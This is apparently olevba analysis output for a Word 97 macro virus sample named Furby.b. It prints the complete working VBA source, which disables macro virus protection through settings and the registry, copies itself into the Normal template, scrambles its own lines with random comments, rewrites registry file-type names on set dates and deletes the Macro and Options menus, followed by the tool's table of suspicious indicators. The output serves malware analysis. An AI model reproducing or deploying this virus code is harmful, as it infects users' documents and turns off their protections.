olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Furby.b-c6344e71f21b743c974447528d977421191893ea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Furby.b-c6344e71f21b743c974447528d977421191893ea - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo furby
Randomize: Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): zz = 5: vx = 1: xv = 4: x = 0: z = 0: y = 0
rtx = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
'83337603048Clippit8333760304883337603048Truec:\program files\microsoft office\office\startup
stx = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
If stx > Sgn(x) And rtx > Sgn(x) Then GoTo furby
If stx = Sgn(x) Then
    Set xyz = NormalTemplate.VBProject.VBComponents
'51018405180Clippit5101840518051018405180Truec:\program files\microsoft office\office\startup
    Set xhst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) = 1 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Furby!"
    If Month(Now()) = 2 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Addin.8", "") = "Microsoft Furby Addin"
    If Month(Now()) = 3 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "Word Furby Document"
'35987483299Clippit3598748329935987483299Truec:\program files\microsoft office\office\startup
    If Month(Now()) = 4 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Application.8", "") = "Microsoft Furby Application"
    If Month(Now()) = 5 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Template.8", "") = "Microsoft Furby Template"
    If Month(Now()) = 6 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Template.8", "") = "PowerPoint Furby Template"
    If Month(Now()) = 7 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.RTF.8", "") = "Rich Furby Format"
'65927441764Clippit6592744176465927441764Truec:\program files\microsoft office\office\startup
    If Month(Now()) = 8 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Wizard.8", "") = "Microsoft Furby Wizard"
    If Month(Now()) = 9 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Picture.8", "") = "Microsoft Furby Picture"
    If Month(Now()) = 10 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Show.8", "") = "Microsoft Furby Presentation"
    If Month(Now()) = 11 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\ExcelWorksheet", "") = "Microsoft Furby Worksheet"
'56545391925Clippit5654539192556545391925Truec:\program files\microsoft office\office\startup
    If Month(Now()) = 12 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Slide.8", "") = "Microsoft Furby Slide"
    xhst.Item(Cos(Atn(CInt(1)))).Name = xyz.Item(Cos(Atn(CInt(1)))).Name
    xhst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Abs(vx) & Chr(46) + Chr(100) + Chr(108) + Chr(108)
End If
'41282335350Clippit4128233535041282335350Truec:\program files\microsoft office\office\startup
If rtx = Sgn(x) Then Set xyz = ActiveDocument.VBProject.VBComponents
xyz.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Abs(vx) & Chr(46) + Chr(100) + Chr(108) + Chr(108)
With xyz.Item(Cos(Atn(CInt(1)))).codemodule
    For j = Abs(vx) To Abs(xv)
'47427286274Clippit4742728627447427286274Truec:\program files\microsoft office\office\startup
    .deletelines Abs(vx)
        Next j
End With
With xyz.Item(Cos(Atn(CInt(1)))).codemodule
'14585133186Clippit1458513318614585133186Truec:\program files\microsoft office\office\startup
 For j = Abs(zz) To xyz.Item(Cos(Atn(CInt(1)))).codemodule.countoflines Step Abs(zz)
    y = Int(Rnd(412835) * 303989) + 8485
    z = Int(Rnd(487958) * 785865) + 2988
    .replaceline j, Chr(39) & y * z & Application.Assistant & z * y & y * z & Application.DisplayRecentFiles & Application.StartupPath
'26774906008Clippit2677490600826774906008Truec:\program files\microsoft office\office\startup
    Next j
 End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
'48996498461Clippit4899649846148996498461Truec:\program files\microsoft office\office\startup
If stx = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete
If stx = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(115) + Chr(46) + Chr(46) + Chr(46)).Delete
If stx = Sgn(x) Then xyz.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(vx), "Sub AutoClose()"
If stx = Sgn(x) And rtx = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'96271233660Clippit9627123366096271233660Truec:\program files\microsoft office\office\startup
furby:
If stx <> Sgn(x) And rtx = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/It's Furby by Virus :) Smile
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|A(#55               |41282335350C                                 |
+----------+--------------------+---------------------------------------------+

